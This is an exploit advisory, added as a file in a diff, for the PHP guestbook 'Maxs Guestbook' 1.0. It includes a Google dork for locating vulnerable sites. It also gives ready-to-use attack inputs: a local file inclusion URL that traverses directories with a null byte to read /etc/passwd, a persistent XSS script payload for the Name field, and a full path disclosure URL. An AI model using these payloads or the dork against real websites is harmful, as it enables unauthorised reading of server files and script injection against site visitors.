@@ -1,0 +1,25 @@
+# Exploit Title: Maxs Guestbook
+# Google Dork: "Powered by PHP F1"
+# Date: 14/03/2012
+# Author: n0tch aka andmuchmore
+# Software Link: http://www.phpf1.com/download.html?dl=18
+# Version: 1.0
+# Tested on:  Windows 7 / Linux(Ubuntu)
+
+
++[-- LFI --]+
+
+http://localhost/max/index.php?page=../../../../../../../../../../../../../../../../../etc/passwd%00
+
++[-- Persistent XSS --]+
+
+Vulnerable Field = "Name"
+Payload syntax: <script>alert('hello')</script>
+
++[-- FPD --]+
+
+http://localhost/max/index.php?page[]=2
+
++[-- Shoutz --]+
+
+All the belegit crew..
